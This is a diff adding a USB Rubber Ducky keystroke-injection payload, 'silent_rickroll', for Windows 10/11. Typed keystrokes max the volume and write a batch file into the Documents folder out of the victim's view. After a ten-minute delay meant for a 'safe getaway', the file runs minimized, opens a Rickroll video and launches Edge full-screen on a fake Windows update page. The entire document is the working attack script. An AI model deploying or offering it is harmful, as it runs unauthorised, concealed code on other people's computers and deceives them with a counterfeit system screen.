@@ -1,0 +1,84 @@
+REM Author: victor-a-c
+REM Title: silent_rickroll
+REM Target: Windows10/11
+
+REM Description:
+REM the payload sets volume to maximum
+REM creates batch file with delay which will run while the prompt window is minimized
+REM after the first delay ends Never Gonna Give You Up starts playing on default browser
+REM a few seconds later it opens edge (present in all windows computers) and opens fake windows update on full screen
+REM "GUI SPACE" works for computers with locked prompts, which allows for program search
+REM "GUI r" should be used for regular computers
+
+REM set volume to max as fast as possible
+DELAY 2000
+GUI
+SPACE
+STRING settings
+ENTER
+STRING adjust volume
+DOWNARROW
+ENTER
+TAB
+REPEAT 10
+RIGHTARROW
+REPEAT 78
+ALT F4
+
+
+REM creates batch file
+GUI
+SPACE
+STRING notepad
+DELAY 12
+ENTER
+DELAY 100
+REM batch file commands
+REM uses just "start" batch command to open website on default browser
+REM double quotes after "start" are necessary for the command to work
+REM Batch file will run while minimized
+STRING if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
+DELAY 100
+REM batch delay for when Never Gonna Give You Up will start being played
+REM enough time for the ducky to be removed after the script is executed and allow for a safe getaway
+STRING TIMEOUT /T 600
+DELAY 37
+ENTER
+REM on default browser
+STRING START "" https://www.youtube.com/watch?v=xm3YgoEiEDc
+DELAY 10
+ENTER
+REM Opens microsoft edge, opens fake windows update and sets it full screen
+STRING START Powershell -command "$wshell = New-Object -ComObject wscript.shell;[system.Diagnostics.Process]::Start(\"msedge\",\"about:blank\");Sleep 1;$wshell.SendKeys('^"{l}"');Sleep 1;$wshell.SendKeys('https://fakeupdate.net/win10ue/');$wshell.SendKeys('"{Enter}"');$wshell.SendKeys('"{F11}"')"
+STRING exit
+REM save as
+ALT F
+DOWNARROW
+REPEAT 3
+ENTER
+DELAY 100
+TAB
+REPEAT 9
+DELAY 57
+REM selects documents folder
+STRING doc
+ENTER
+DELAY 32
+TAB
+REPEAT 2
+REM tr = silent roll
+STRING sr.bat
+DOWNARROW
+REPEAT 1
+TAB
+REPEAT 2
+ENTER
+DELAY 200
+REM batch file has been saved to documents folder out of the user's immediate view
+
+
+REM execute the batch file
+GUI
+SPACE
+STRING sr.bat
+ENTER
